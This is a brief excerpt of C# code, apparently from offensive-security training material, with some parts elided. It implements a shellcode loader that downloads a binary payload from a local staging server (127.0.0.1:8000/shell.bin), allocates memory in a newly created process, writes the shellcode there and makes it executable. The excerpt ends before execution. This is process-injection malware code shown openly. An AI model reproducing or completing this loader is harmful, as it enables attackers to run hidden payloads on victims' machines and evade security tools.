...
class Program
{
    ...
    static void Main()
    {
        string url = "http://127.0.0.1:8000/shell.bin"; // IMPORTANT: include port

        // 1. Download shellcode
        byte[] shellcode = new WebClient().DownloadData(url);

        // 2. Create the target process
        ...
        IntPtr lpBaseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, PageReadWrite);
        IntPtr outSize;
        WriteProcessMemory(procInfo.hProcess, lpBaseAddress, shellcode, shellcode.Length, out outSize);
        uint lpflOldProtect;
        VirtualProtectEx(procInfo.hProcess, lpBaseAddress, (uint)shellcode.Length, PageReadExecute, out lpflOldProtect);
